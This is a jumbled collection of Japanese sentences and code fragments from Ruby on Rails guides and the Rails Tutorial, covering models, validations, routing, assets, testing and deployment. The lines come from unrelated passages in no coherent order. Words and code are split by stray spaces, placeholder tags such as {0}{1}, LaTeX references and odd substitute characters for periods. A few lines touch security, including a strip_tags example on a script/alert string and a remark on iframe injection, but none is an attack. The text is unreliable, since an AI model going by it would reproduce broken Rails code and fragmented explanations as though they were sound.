以下 は 、 上 と 同等 の コード で す 。
person ▖errors▖ size # = >  0
     attr_accessor   : author_ name
値 が ` nil ` や 空 文字 で な い ( つまり 空欄 で も な けれ ば ホワイト スペース で も な い ) こと を 確認 する ため に 、 内部 で は ` blank ? ` メソッド を 使用 し て い ま す 。
* `: delete ` を 指定 する と 、 関連 付け られ た オブジェクト は すべて データベース から 直接 削除 さ れ ま す ▟ この とき コール バック は 実行 さ れ ま せ ん 。
ありがた い こと に 、 Sessions コントローラ   ( \ ref{ sec : sessions_controller} )   を 生成 し た 時点 で 既に セッション 用 ヘルパー モジュール も   ( 密か に )   自動 生成 さ れ て い ま す 。
|   JSON                               |  パラメータ                 |
< / header>
Rails アプリケーション 内 や Rails エンジン 内 の Java Script ファイル は 、 ` app/assets` 、 ` lib/assets` 、 ` vendor/assets ` の いずれ か の 場所 に 置 か れ ま す 。
{ 0 } Figure   2 ▖ 15 :   {/ 0 } { 1 } The   association   between  microposts  and   users ▖ { / 1 }
これ は 本質 的 に 、 アプリケーション と エンジン が 完全 に 同一 の 名前 の ルーティング を 持 つ こと が でき 、 しかも 衝突 し な い と い う こと を 意味 し ま す 。
###  ミドルウェア を 理解 する
*  ` has_many`
（ Text Mate は Mac   OS   X 版 しか あ り ま せ ん が 、 Mac ユーザー に と っ て は Text Mate は 現在 で も 良 い 選択 で あ る と 言え ま す ▟ )
dc : creator " ,  item▖ author_ name )   if  item_ has_creator ? (
この ` to _ formatted_s ` メソッド は 、 " F " の デフォルト の 指定 部   ( specifier )   を 提供 し ま す 。
*  `config▖ active_ record ▖ pluralize_table_names` は 、 Rails が 探 す データベース の テーブル 名 を 単数 形 に する か 複数 形 に する か を 指定 し ま す 。
BigDecimal ▖ new ( 5 ▖ 0 0 ,   6 ) ▖ to_s  # =>  " 5 ▖ 0 "
この 機能 の 使用 法 に つ い て は [ send _file ] ( http://api▖ rubyonrails ▖org / classes / Action Controller /DataStreaming ▖ html # method - i -send _file ) を 参照 し て くださ い 。
テスト 時 に メール 送信 を 抑制 する の に 便利 で す 。
Using   RSpec
User モデル と ユーザー 登録 機能 の 開発 が 終わ っ た の で 、 今度 は この サンプル アプリケーション を 本番   ( production )   環境 に 展開 し ま しょ う
Time▖zone_default
Rails の モデル は 、 単数 形 の 名前 を 持 ち 、 対応 する データベース テーブル 名 は 複数 形 で 表 さ れ る と い う ルール が あ り ま す 。
      #  ここ で すべて の 初期 化 を 行な う
これ は リスト \ ref{ code : signin_success_tests } で 使用 さ れ て い ま し た 。
*   Ruby   on   Rails セキュリティ プロジェクト に は 定期 的 に セキュリティ 情報 が 掲載 さ れ ま す :   [ http://www ▖rorsecurity▖ info ] ( http://www ▖rorsecurity▖ info )
WARNING :   この ガイド は Rack の ミドルウェア 、 url マップ 、 ` Rack : :Builder ` と い っ た Rack の プロトコル や 概念 に 関 する 実用 的 な 知識 が あ る こと を 前提 に し て い ま す 。
この オプション は 、 デフォルト で は 以下 の よう に 設定 さ れ ま す 。
この ルーティング は 、 ` YourApp:: Application ` クラス で は な く ` Blorgh : : Engine ` オブジェクト に もとづ い て い る こと に ご 注目 くださ い 。
もし テスト スイート が 理由 も な く 壊れ る よう な こと が あ れ ば 、 \ kode {rake   test : prepare } を 実行 し て 、 この 問題 が 解決 する か 確認 し て み て くださ い 。
一致 し な い 場合 、 例外 は キャプチャ さ れ ま せ ん 。
メール フォーマット の 検証 に 対 する テスト   (  \failing   )
隠れ て い る \ kode {▖ gitignore } ファイル を 表示 する
置き換え た 結果 を { 0 } { 1 } リスト 4 ▖ 3 { / 1 } { / 0 } に 示 し ま す 。
//= require   phonebox
` in_groups_of ` メソッド は 、 指定 の サイズ で 配列 を 連続 し た グループ に 分割 し ま す 。
レイアウト や スタイル が 整 っ て い な い 。
` :omis sion ` オプション を 指定 する こと で 、 省略 文字   ( … )   を カスタマイズ する こと も でき ま す 。
`exists ? ` メソッド は 、 引数 なし で モデル や リレーション に 使用 する こと も でき ま す 。
アクション
有効 な ユーザー の フィクスチャ を 作成 でき た の で 、 テスト で 以下 の よう に フィクスチャ データ を 参照 でき ま す 。
SELECT  *  FROM   clients   WHERE   ( clients▖ first _ name  =  'Nick ')   LIMIT   1
これ ら の ページ の 中 で 最も 重要 な 、 Home ページ の モックアップ を 図 \ ref { fig : home_ page _mockup } に 示 し ま す 。
{ 0 } 第 { 1 } 3 { / 1 } 章 { / 0 } で は 静的 な ページ を 作成 し 、 そこ に 動的 な 要素 を 順次 追加 し て い き ま す 。
###  Action   View を 設定 する
*  ` action_controller▖ compile_config_ methods ` :   指定 さ れ た 設定 用 メソッド を 初期 化 し 、 より 高速 に アクセス でき る よう に し ま す 。
protect _ from _ forgery
ドット
####  リバース プロキシ を 使用 する
上 の 指定 に よ り 、 ` Magical : :Unicorns ` ミドルウェア が スタック の 最後 に 追加 さ れ ま す 。
|   ファイル                                           |  目的                                                                                                 |
ここ で は 、 リスト { p 0 } の よう に { 2 }gravatar _ for { / 2 } ヘルパー メソッド を 使用 し て Gravatar の 画像 を 利用 でき る よう に し ま す 。
これ は リスト \ ref{ code : nested_ hashes } で 使用 さ れ て い ま し た 。
@orders ▖each   do  | order |
123456 78 ▖ to_s(: delimited )                      # = >  12 , 345 ,67 8
ここ で 、 User モデル に \ kode { admin } 属性 と い う もの が あ る と し ま しょ う ▟ この 属性 は 、 Web サイト の 管理 者 で あ る か どう か を 示 し ま す
  end
# =>  Wed ,   23   Nov  2011
これ に よ り 、 GitHub 上 の ブランチ と プルリクエスト が 新し い コード に よ っ て 更新 さ れ ま す 。
\emph { 範囲   ( range ) }  は 、 配列 と 密接 に 関係 し て い ま す ▟ \ kode {to\_ a } メソッド を 使用 し て 配列 に 変換 する と 理解 し やす い と 思 い ま す 。
シンプル な 実装 は 以下 の よう に な り ま す 。
パスワード は 空欄 で あ っ て は な ら な い の で 、 パスワード の 存在 確認 テスト を 別 に 追加 し ま す 。
    resources  : categories ,   path :  'kategorien'
WARNING :   この メソッド は ` INNER   JOIN ` で しか 使用 でき ま せ ん 。
self を 省略 し た 結果 を リスト \ ref{ code : gitignore _uploads } に 示 し ま す 。
\ kode { home } アクション 内 で 、 フィード に も ページ ネーション を 適用 する
"  \n     foo\ n \r  \t bar \ n " ▖ squish # =>  " foo  bar "
|field|   record▖send ( field)  ==  " Evil "   }
` config/ environments/development ▖ rb ` に 以下 の 行 が あ り ま す 。
    mattr_accessor   : explicitly_unloadable_constants
そこ で 、 " Andy " と い う 名前 の クライアント を 検索 する か 、 その 名前 の クライアント が い な い 場合 は " Andy " と い う クライアント を 作成 し て ロック を 外 す こと に し ま す 。
╼\end{ code }╼╼  \ subsection { 本番 環境 で の SSL } %  ( fold) ╼  \ label{ sec : ssl_ in_production}╼╼
: attributes オプション また は : tags オプション が 渡 さ れ る と 、 そこ で 指定 さ れ た タグ および 属性 のみ が 処理 の 対象 外 と な り ま す 。
( 1 ▖ ▖ 10 )   = = =   ( 3 ▖ ▖ 7 )    # => true
そこ で 、 ログ イン に 失敗 し た とき に は 代わり に フラッシュ メッセージ を 表示 する こと に し ま す 。
ユーザー プロフィール と スタイル の な い マイクロ ポスト
最初 の サイン インビュー 。
### ` duplicable ?
リスト \ ref{ code : signup_with _account_activation_test } の コード は 分量 が 多 い よう に 見え ま す が 、 本当 に 重要 な 部分 は 以下 の 1 行 で す 。
まず は ユーザー の 情報 が 互い に 編集 でき な い こと を 確認 する ため に 、 サンプル ユーザー を もう 一人 追加 し ま す 。
エラー メッセージ が 必要 で あ れ ば 、 バリ データ クラス の レコード の エラー コレクション に 手動 で 追加 する 必要 が あ り ま す 。
( { 0 } { 1 } 第 8 章 { / 1 } { / 0 } で 本格 的 に 実装 し ま す ) 。
### ` head ` で ヘッダ のみ の レスポンス を 生成 する
通常 の ファイル は ` rewind ` に 応答 し ま す 。
これ は リスト \ ref{ code :rails_default _head } で 使用 さ れ て い ま し た 。
データベース に User オブジェクト を 保存 する ため に は 、 \ kode {user } オブジェクト から \ kode {save } メソッド を 呼び出 す 必要 が あ り ま す 。
( 1 ▖ 9 の contact 機能 の 正確 な 動作 を 理解 し て い る こと が 前提 で す ) 。
##### ` beginning _ of_ year ` 、 `end _of_ year `
これ を 利用 し て 、 エラー メッセージ を もっと 目立 た せ る よう に css ルール を 定義 し て も 構 い ま せ ん 。
Rails に よ っ て Ruby の 組み込 み クラス に 追加 が 行 わ れ て い る 例 に つ い て は 、 \ ref{ sec : remember_me } で 説明 し ま す 。
#  Use  unicorn   as  the app server
\ kode {gem}   コマンド で 特定 の バージョン 番号 を 指定 し な い 限り 、 Bundler は 自動 的 に 最新 バージョン の gem を 取得 し て インストール し て くれ ま す 。
\ kode {edit } アクション の 実装 から 始め ま す が 、 ここ で は データベース から 適切 な ユーザー データ を 読み込 む 必要 が あ り ま す 。
これ は リスト \ ref{ code : gemfile_sqlite_ version } で 使用 さ れ て い ま し た 。
def  log _ info ( sql,   name ,   ms )
{ 0 } 図 7 ▖ 2 { / 0 } { 1 } 理想 と する 最終 的 な プロファイル ページ の モックアップ ▟ \ href { http://railstutorial ▖org / images/figures/profile_mockup_bootstrap - full ▖ png } { ( 拡大 ) } { / 1 }
以上 で 、 Ruby 言語 の 概要 の 説明 を 終わ り ま す 。
    gem  'uglifier' ,      '> =   1 ▖ 0 ▖ 3 '
f
これ を 確認 する に は 、 ユーザー の \emph{count } を 使用 し ま す ▟ 背後 で 動作 する この \ kode { count } メソッド は 、 \ kode {User } を 含 む あらゆる Active   Record クラス で 使用 でき ま す 。
   def  validate_each ( record ,   attribute ,   value )
最後 に 、 開発 用 データベース に マイグレーション を 行 い 、 テスト 用 データベース を 準備 し ま す 。
config▖ active_ record ▖ mass_assignment_sanitizer  = : strict
####  date_field
self を 省略 し た 結果 を リスト \ ref{ code : validates_presence _ of_ name } に 示 し ま す 。
順序 を 逆 に し た い 場合 は 、 一 段階 低 い レベル の 技術 で は あ り ま す が 、 次 の よう に 生 の SQL を 引数 に 与え る 必要 が あ り ま す 。
ハッシュ で は シンボル を キー と し て 使 う こと が 一般 的 な の で 、 Ruby   1 ▖ 9 で は この よう な 特殊 な 場合 の ため の 新し い 記法 を サポート し て い ま す 。
*  `rake   doc: rails ` を 実行 する と 、 Rails   API ドキュメント の 完全 な コピー が アプリケーション の ` doc/api ` フォルダ に 生成 さ れ ま す 。
RubyGems は Ruby の プロジェクト の ため の パッケージ マネージャ で あ り 、 Ruby の パッケージ   ( \emph {gem} )   と し て 利用 でき る 多く の 有用 な ライブラリ が あ り ま す ▟ Rails も gem と し て インストール し ま す 。
基本 と な る タイトル を 含 む StaticPages コントローラ の spec 。
  $ rails  console
幸い 、 結合 テスト は フラッシュ メッセージ 残留 など の 多く の 問題 解決 に お い て 大 活躍 し ま す ▟ 期待 さ れ る 動作 は 以下 の テスト で 正確 に 表現 さ れ て い ま す 。
###  エンジン を 設定 する
create       test/fixtures/blorgh/articles▖yml
Scaffold は 何 より も 手っ取り 早 い の が とりえ だ が 、 これ を 元 に Rails を 理解 する に は 向 い て い な い 。
password
分割 さ れ た グループ を 内包 する 配列 を 1 つ 返 し ま す 。
sys 	 0 m 0 ▖ 258 s
たとえば 、 ユーザー 登録 フォーム で 新し い ユーザー を 作成 する とき は 、 \ texttt { POST } リクエスト を 送信 し ま す 。
  <td > Ruby   on   Rails   Rocks !
$  rackup --help
###  アセット の 編成
It   worked !
今回 \ kode {before\ _create } コール バック を 使用 する 目的 は 、 トークン と それ に 対応 する ダイジェスト を 割り当て る ため で す ▟ 割り当て は 以下 の よう に 行 う こと が でき ま す 。
*  `save ( validate:  false ) `
d   =  Date▖ new (2000 ,   2 ,   29 )   # =>  Tue ,   29   Feb   2000
` collection▖build ` メソッド は 、 関連 付け が 行 わ れ た オブジェクト を 1 つ また は 複数 返 し ま す 。
サンプル アプリケーション を 生成 する   \ passing
その よ い 例 は ` jquery - rails `   gem で す ▟ これ は 標準 の Java Script ライブラリ を gem と し て Rails に 提供 し ま す 。
今度 は \ kode {rake   test } の 結果 は   \ passing   に な る はず で す 。
<table>
この コード を 使用 し て マイクロ ポスト の 合計 数 を 表示 し ま す 。
そう し た トラブル は むしろ 技術 の 理解 を 深め る 絶好 の チャンス と 捉え 、 頑張 っ て 解決 して み ま しょ う 。
上 の 例 で は 、 ` : message ` オプション を 使用 し て 属性 の 値 を 含め る 方法 を 示 し て い ま す 。
この テスト で は 、 \ kode {reload } メソッド を 使用 し て データベース から 値 を 再度 読み込 み 、 \ kode {assert\_equal } メソッド を 使用 し て 同値 で あ る か どう か を テスト し て くださ い 。
何 やら コード が たくさん 書 か れ て い て 読 み にく い よう に 思え ま す 。
それぞれ の 部分 が どう い う 意味 な の か を 見 て み ま しょ う 。
「 docrails の changelog も 絶対 に 変更 し な い こと 」
この ディレクティブ で は 拡張 子 を 明示 的 に 指定 する 必要 は あ り ま せ ん 。
（ \ texttt { - u } フラグ に つ い て は 気 に する 必要 は あ り ま せ ん ▟ 気 に な る の で あ れ ば   " git  set   upstream " で 検索 し て み て くださ い ） 。
パス に マッチ する 動的 セグメント を 再 利用 し て リダイレクト する こと も でき ま す 。
    if   record ▖ first _ name  ==  " Evil "
本章 で は 、 アプリケーション で メール の 送受信 を 行え る よう に する ため に 必要 な すべて の 事項 と 、 Action   Mailer の さまざま な 内部 情報 を 提供 し ま す 。
     trashable  =   trashable_class▖ constantize▖find ( trashable_ id )
この テスト は { 0 } { 1 } { / 1 } { 1 } { 2 } 成功 { / 2 } { / 1 } { 1 } { / 1 } { / 0 } する はず で す 。
以下 の よう に 、 数値 を 電話 番号 形式 の 文字 列 に 変換 でき ま す 。
#### ` assert_ generates ` アサーション
自分 の 環境 で 動作 する の で あ れ ば 、 それ ら の gem の 行 を コメント 解除 し て も 構 い ま せ ん ▟ )
< script   src= "/assets/tickets▖ js?
いよいよ 、 ここ まで の 苦労 の 成果 を 確認 する 準備 が でき ま し た   ( 図 \ ref { fig : layout_no_ logo_or_ custom_css } ) 。
{ 0 } 図 7 ▖ 19 { / 0 } { 1 } ユーザー 登録 に 成功 し た 画面 の モックアップ ▟ \ href { http://railstutorial ▖org / images/figures/signup_success_mockup_bootstrap - full ▖ png } { ( 拡大 ) } { / 1 }
アセット パイプライン 導入 後 は 、 ` app/assets ` ディレクトリ が アセット の 置き 場所 と し て 推奨 さ れ て い ま す 。
これ ら の メソッド は 、 ビルト イン 版 の メソッド と 類似 し て い ま す 。
Home ページ の 内容 を テスト する コード 。
私 は 、 Rails の 実際 の 実装 と は 無 関係 に 、 コントローラ を 情報 の 流れ の 中心 と な る ハブ と みな す こと を 好 ん で い ま す 。
strip_tags ( " some<<b > script> alert ( 'hello') <</b>/script> " )
Active   Support に も いく つ か の 設定 オプション が あ り ま す 。
      invoke      coffee
@order   =  Order▖ create(order_ date:   Time▖now ,   customer_ id : @customer▖ id )
" hello " ▖ to ( 0 )    # => " h "
╼╼    \ subsection { Heroku に デプロイ する   ( 2 ) } ╼    \ label{ sec : heroku_step_two}╼╼ There   is   no  step two!
この ページ を 作成 し た ら 、 { 0 } { 1 } 第 12 章 { / 1 } { / 0 } の サンプル ・ アプリケーション で 使用 する 予定 で す 。
| --------- | ------------------------------------ | ----------------- | -------------------------------------------------------------------------- |
渡 さ れ た コード を Java Script 用 タグ に ラップ し て 返 し ま す 。
エンジン の 機能 を 提供 する
###  Record TagHelper
ユーザー の edit ビュー
=>   " 1 fda 4469 bcbec3 badf 541 82 69 ffc 596 8 "
利便 性 の ため 、 この とき インスタンス メソッド も 生成 さ れ ま す が 、 これ ら は 実際 に は クラス 属性 の 単なる プロキシ で す 。
*  `edit▖html ▖erb `
#   時刻 選択 用 タグ を 作成 する ▟ フォーム が POST さ れ る と 、 submitted 属性 の order 変数 が 保存 さ れ る 。
この メソッド は 、 `find ` と 同様 の クエリ を 使用 し て データベース に クエリ を 送信 し ま す が 、 オブジェクト の コレクション の 代わり に ` true ` また は ` false ` を 返 し ま す 。
` cattr_reader` 、 ` cattr_writer ` 、 ` cattr_accessor ` マクロ は 、 ` attr_*` と 似 て い ま す が 、 クラス 用 で あ る 点 が 異な り ま す 。
options _ for_select ( [   " VISA " ,   " MasterCard "   ] )
  around _perform   do  | job , block |
use   Rack : : ConditionalGet
{ 0 } 表   5 ▖ 1 { / 0 }   { 1 } サイト リンク の ルート   ( routing )   と URL の マッピング { / 1 }
この 場合 、 \ kode {center } クラス に 属 し て い る   ( \kode {div } など の )   タグ の 内側 に あ る 要素 は 、 すべて ページ 中 で センタリング さ れ る こと を 意味 し て い ま す
ユーザー インデックス 用 の スタイル 。
この コード は 自動 的 に 、 \ kode {user ▖ followed_users } を 「 フォロー し て い る ユーザー 」 の 配列 を 使用 し て 展開 し ま す 。
ユーザー 編集 ページ に 対応 する ビュー   を 、 リスト \ ref{ code :user_edit_view } に 示 し ま す   ( この ファイル は 手動 で 作成 する 必要 が あ り ま す ) 。
StaticPages コントローラ を 生成 する
     def  #{severity ▖ downcase } ( message = nil ,   progname  = nil ,  &block )   #  def  debug ( message = nil ,   progname  = nil ,  &block )
クライアント 側 の コード で は 衝突 の 可能 性 に つ い て 考慮 せ ず に 独自 に ` : log _ level ` を サブ クラス で 定義 し て い ま す 。
* `new_ geocoder_ path ` は `/ geocoder/new ` を 返 し ま す
cookies を 設定 後 、 移動 先 の ページ で 以下 の よう な コード を 使用 し て ユーザー を 取り出 す こと が でき ま す 。
   def  new
ユーザー を 新規 作成 する ページ   ( ユーザー 登録 )
class  Client <  ActiveRecord : : Base
< / form >
    has_many  : orders ,   dependent :  : delete_all ,   validate: :false
新し い セッション を 作成 する
Microposts コントローラ の 骨格
何 が 追加 さ れ る か 考え て み ま しょ う ) 。
d ▖ prev_ year                # =>  Sun ,   28   Feb   1999
   transform _keys { |key|  key▖ to_s }
    has_and _belongs_to_many  : friends ,
通常 の テキスト フィールド を 作成 し ま す ▟ ユーザー 名 や 検索 キー ワード 入力 用 の フィールド に は この 通常 の テキスト フィールド を ご 使用 くださ い 。
*   イニシャライザ
代り に 、 ハッシュ の 配列 を 返 し ま す ▟ 1 つ の ハッシュ が 1 レコード を 表 し ま す 。
|                     |  42 9                | : too_many_ requests               |
残 っ て い る 箇所 は 、 Microposts コントローラ の 認可 を チェック する 短 い テスト と 、 それ ら を まとめ る 統合 テスト を 書 く こと で す 。
* =  require   reset
たった これ だけ で 、 Rails は \ href { http://catb▖org /jargon/html / A/automagically▖html } { 自動 的 に } Ajax を 使用 し ま す
config ▖ assets▖digest   =  true
       create      app/views/users/new▖html ▖erb
続 い て 、 エンジン の ` Blorgh : : Article Controller# article _params ` メソッド を 更新 し て 、 新し い フォーム パラメータ を 受け付け る よう に する 必要 も あ り ま す 。
Array ( foo:  :bar)       # => [ [ : foo,  : bar ] ]
  >>  10 ▖ weeks ▖ago
       create       test/controllers/users_controller_test ▖ rb
Active   Record は 、 データベース 内 の データ に アクセス する ため の リッチ な API を 提供 し ま す 。
Date▖ new (2012 ,   2 ,   29 ) ▖ years_ since ( 3 )    # =>  Sat ,   28   Feb   2015
また 、 シンボル を 使用 し た 指定 部 も サポート さ れ ま す 。
これ に よ り 、 リモート クライアント は   ( 訳注 :   既存 の キャッシュ を 使用 せ ず に )   コンテンツ の 新し い コピー を サーバー に リクエスト し ま す 。
本 ガイド で は 、 アセット パイプライン   ( asset pipeline )   に つ い て 解説 し ま す 。
たとえば 、 1 つ の データベース モデル に 全 従業 員 を 格納 し て お き た い が 、 マネージャー と 部下 ( subordinate ) の 関係 も 追え る よう に し て お き た い 場合 が 考え られ ま す 。
モデル オブジェクト の 初期 化 時 に 指定 し な かっ た フィールド に アクセス し よう と する と 、 以下 の メッセージ が 表示 さ れ ま す 。
この div タグ に 好み の スタイル を 与え る こと が でき ま す 。
そこ で 、 アカウント を 有効 化 する 手順 を 実装 し て 、 ユーザー が 登録 に 使用 し た メール アドレス を 本当 に 所有 、 管理 し て い る の か どう か を 確認 する よう に し ま しょ う 。
ここ で は 、 リスト \ ref{ code :user_ show _ view_ with _gravatar } の よう に \ kode{gravatar \_ for } ヘルパー メソッド を 使用 し て Gravatar の 画像 を 利用 でき る よう に し ま す 。
テスト に すべて パス すれ ば 、 貢献 を 提案 する 準備 が 整 い ま す 。
まず は この HTML ソース の 内部 構造 に つ い て 説明 し ま す 。
assemblies▖ delete (object ,  ▖▖▖)
= > [ " Email   is   invalid " ,   " Password   is   too  short  ( minimum   is   6   characters) " ]
Rails   4 に は [ Turbolinks  gem ] (https://github▖ com/rails/turbolinks ) が 同梱 さ れ て い ま す 。
フィード の 最終 的 な 実装  
そこ で 、 今回 も \ kode {let ! } を 使 い ま す 。
Guard は 自動 的 に Spork サーバー を 起動 する ため 、 テスト 実行 時 の オーバヘッド を 劇的 に 削減 でき ま す 。
本番 環境 で 動 く サンプル アプリケーション
issue の レポート
date_field_tag   " dob "
編集 の 失敗 に 対 する テスト
これ に よく 似 た 状況 を \ ref{ sec :uniqueness_validation } で も 説明 し ま し た ▟ メール アドレス を データベース に 保存 する 前 に 、 メール アドレス を 全部 小 文字 に 変換 する 必要 が あ っ た の で し た 。
` head ` メソッド は ` ren der  : nothing ` より も 柔軟 性 が 高 く 、 HTTP ヘッダー だけ を 生成 し て い る こと が 明確 に な る から で す 。
この 設定 を アプリケーション 内 で 行な う に は 、 イニシャライザ を 使用 する 必要 が あ り ま す 。
NGINX の 場合 :
#   SELECT   count (*)   AS   count_all   FROM   clients
  </div>
  # 'included  do ' は 、 インク ルード さ れ た コード を
    has_many  : patients ,  through :  : appointments
*   [ Rack 公式 サイト ] ( http://rack ▖ github▖io)
    end                                                               # end
これ を 解決 する に は 、 以下 の よう に フォーム の url を 直接 指定 し ま す 。
` camelize ` メソッド は オプション の 引数 を 受け付け ま す ▟ 使用 でき る の は ` : upper`   ( デフォルト )   また は ` : lower ` で す 。
   concerns  : commentable
この コード は リスト \ ref{ code :micropost _order_test } で 使用 さ れ て い ま し た ▟ もう ひと つ 、
最初 に ` data- * ` 属性 を リンク に 追加 し て お き ま す ▟ 続 い て 、 この 属性 を 持 つ すべて の リンク で 発生 する クリック イベント に ハンドラ を バインド し ま す 。
\ kode {email } 属性 の 存在 性 を 検証 する   GREEN { 3 } { 4 } { / 4 } { 4 } { 5 } { / 5 } { / 4 } { 4 } { / 4 } { / 3 }
Git を 使 っ て い る 方 は 、 この 時点 で master ブランチ に 変更 を マージ し て くださ い 。
アップグレード 時 に は この 記述 を Gemfile から 削除 する 必要 が あ り ま す 。
読者 が 話 す 言語 に 応じ て 異な る ニュースレター を 送信 し た い と し ま す 。
特定 の 属性 に アクセス する ため の 、 テキスト エリア 用 開始 タグ と 終了 タグ を 返 し ま す 。
表示 し た い 文字 列 を 返 す アクション を 定義 し た の で 、 今度 は デフォルト の ページ   ( 図 \ ref { fig: riding _ rails_environment} )   の 代わり に この アクション を 使用 する よう Rails に 指示 し ま す 。
use  #< ActiveSupport: : Cache: : Strategy : : Local Cache: : Middleware : 0 x 00000002 9 a083 8 >
ログ インフォーム の モックアップ
* `photos_ path ` は `/photos ` を 返 し ま す
#   app/mailers/application_mailer▖ rb
プロフィール 画面   ( \ href { http://local host : 3000 / users / 2}{ / users / 2 } )   に   [ Follow ]   ボタン が 表示 さ れ て い る
先ほど の 順 で 書 い た 統合 テスト は 、 リスト \ ref{ code :microposts_ interface _ test } の よう に な り ま す 。
` has _one ` 関連 付け を 宣言 し た クラス で は 、 以下 の 5 つ の メソッド を 自動 的 に 利用 でき る よう に な り ま す 。
ユーザー 登録 失敗 ▟ \ href { http://railstutorial ▖org / images/figures/signup _failure_rails _ 4 - full ▖ png } { ( フル サイズ ) }
Active   Record に は 、 クラス 定義 の 内側 で 直接 使用 でき る 定義 済み の バリデーション ヘルパー が 多数 用意 さ れ て い ま す 。
Ruby   on   Rails で 欲し い 機能 が あ る なら 、 自分 で コード を 書 い て くださ い ▟ あるいは 、 誰 か に お 願 い し て コード を 書 い て もら っ て くださ い 。
root   ' pages #main'  #  上 の 省略 形
Rails の コーディング を 行 う 場合 は 、 以下 の シンプル な スタイル ガイド に 従 い ま す 。
class   Role  <  ActiveRecord : : Base
この よう な 場合 に は ` : body ` オプション を 使用 でき ま す 。
\ kode {self } を 使 っ て トークン や ダイジェスト の 新し い メソッド を 定義 する
\ kode { join } メソッド は これ と 逆 の 動作 で す 。
フラッシュ メッセージ の 残留 問題 は この アプリケーション の バグ で す ▟ この 問題 を 修正 する 前 に 、 この 問題 を キャッチ する テスト を 書 く の が 正し い や り 方 で す 。
` ActiveSupport: : Callbacks ` が 書き直 さ れ 、 上 の よう な 動作 は Rails   4 ▖ 1 で は 許容 さ れ な く な り ま し た 。
リソース フル ルーティング を カスタマイズ する
キャッシュ ストア の 設定 は ` config ▖ assets▖ cache_store ` で 変更 でき ま す 。
スコープ で は 、 ` w here ` 、 ` joins ` 、 `includes ` など 、 これ まで に 登場 し た すべて の メソッド を 使用 でき ま す 。
create    app/views/welcome/index▖html ▖erb
( 他 の 3 つ の リンク に は オプション ハッシュ が 指定 さ れ て い ま せ ん が 、 必須 で は な い の で 構 い ま せ ん ) 。
念 の ため 、 最初 に 作成 時 の 状態 に 対 し て も テスト を 書 い て お き 、 最初 の モデル が 有効 で あ る か どう か も 確認 し て お き ま す 。
マイグレーション 自体 は 、 データベース に 与え る 変更 を 定義 し た \ kode { change } メソッド の 集まり で す 。
あなた が コミット し た コード に 対 し て 変更 を 求め られ る こと が あ り ま す 。
    password :
\ kode {print } メソッド も 同様 の 出力 を 行 い ま す が 、 以下 の よう に 、 改行 文字 を 追加 し な い 点 が 異な り ま す 。
幸い 、 それ ら の ほとんど が 現在 で も 入手 / アクセス 可能 で す 。
Contact
#### ` audio _tag ` を 使用 し て 音声 ファイル に リンク する
これ が 、 いわゆる 「 リクエスト - レスポンス 」 の サイクル で す 。
SELECT  *  FROM   clients   WHERE   ( clients▖orders_count   IN   ( 1 , 3 ,5 ) )
╼ publish ,  distribute ,   sublicense ,   and /or sell  copies  of  the   Software ,
この よう な 処理 を その まま 実装 する と 以下 の よう に な る で しょ う 。
`matches ? ` メソッド および ラムダ は いずれ も 引数 と し て ` request ` オブジェクト を 取 り ま す 。
完全 な テスト 機能 を 備え た 強力 な Web フレームワーク が な かっ た 頃 は 、 開発 者 は フォーム の テスト を 毎回 手動 で 行 う 必要 が あ り ま し た 。
$ bun dle   exec   rake   test ╼ $  git   add   - A╼$  git  commit   - m   " Finish  log  in/ log   out " ╼$  git   checkout   master ╼ $  git   merge  log - in - log - out
この 節 の 作業 は かなり 厄介 で す ▟ また 、 bun dle   exec の 入力 を 省略 する 方法 を 2 とおり の 方法 で 説明 し ま す 。
これ は リスト \ ref{ code :user_ spec } で 使用 さ れ て い ま し た 。
いつ も と 同様 、 これ ら の テスト を 以下 の よう に \ kode {rspec } コマンド で 実行 でき ま す 。
dup  =  hash▖ deep_dup
これ は リスト \ ref{ code : test _ close _browser } で 使用 さ れ て い ま し た 。
*  `config▖ active_ record ▖ partial _writes ` は 、 部分 書き込み を 行な う か どう か ( 「 dirty 」 と マーク さ れ た 属性 だけ を 更新 する か ) を 指定 する 論理 値 で す 。
let(:found _user )  { User ▖find_ by (email :  @user ▖email )   }
#### `url_ for ` を 使用 し て URL を 生成 する
アカウント 有効 化 用 の 属性 と インデックス を 追加 する マイグレーション
HTML 構造 を 削除 し た Help ページ
Rails 全般 に 対 する 設定 を 行 う に は 、 ` Rails : : Railtie ` オブジェクト を 呼び出 す か 、 ` Rails : : Engine ` や ` Rails : : Application ` の サブ クラス を 呼び出 し ま す 。
ここ で 、 以下 の コード を 見 て み ま しょ う 。
6   examples ,   0   failures
アプリケーション の 寿命 を 永らえ 、 保守 作業 を 苦痛 な もの に し な い よう に する ため に は 、 コントローラ の コード 量 は 可能 な 限り 減ら す べ き で す 。
Factory   Girl は 、 RSpec を 使用 し て Ruby で 「 ドメイン 特化 言語   ( domain- specific   language ) 」 を 定義 し ま す ▟ ここ で は 、 Active   Record の オブジェクト の 定義 に 特化 し て い ま す 。
get  ' こんにちは ' ,  to :  'welcome#index'
そこ に 見つか ら な い 場合 は 、 続 い て エンジン の 中 を 探索 し ま す 。
Rails ルート で 使用 する Users リソース 用 の ルール
###  BenchmarkHelper
これ を 解消 する に は 、 次 の よう に し ま す 。
ところ で 、 リスト \ ref{ code :persistent_sessions_test } で は 以下 の よう に 書 い て も よ い よう に 思え る か も しれ ま せ ん 。
Rails   3 ▖ 2 から Rails   4 ▖ 0 へ の アップグレード
Application コントローラ に Session ヘルパー モジュール を インク ルード する
今度 は 、 この フォーム を 出力   ( レンダリング )   する ため に PasswordResets コントローラ の \ kode {edit } アクション 内 で \ kode {@user } インスタンス 変数 を 定義 する 必要 が あ り ま す 。
RAILS _ROOT / config/ routes▖rb  #  NO
最も 多 い 攻撃 は 、 iframe を 使用 し て 外部 の コード を Web ページ に 含め る 方法 で す 。
ユーザー 一覧 ページ に 100 人 の サンプル ユーザー が 表示 さ れ て い る
既存 の レコード を 更新 する と 、 SQL の ` UPDATE ` 操作 が 送信 さ れ ま す 。
この 節 の 冒頭 で 簡単 に 紹介 し た よう に 、 この 目的 に 使用 でき る 専用 の テスト データベース \ kode {db /test ▖ sqlite 3 } が あ り ま す 。
{ a :   1 ,  b :   2 ,  c :   3 } ▖slice(:a,  : c )
* * `Rack : : Runtime` * *
    #  do   process   video
上 も 自体 も ハッシュ で あ り 、 以下 の 要素 を 含 ん で い ま す 。
これ は リスト \ ref{ code : gemfile_rspec } で 使用 さ れ て い ま し た 。
経験 から 申し上げ る と 、 どう し て も 必要 な 場合 を 除 い て 、 ドキュメント で シングル トン を 使用 す べ き で は あ り ま せ ん 。
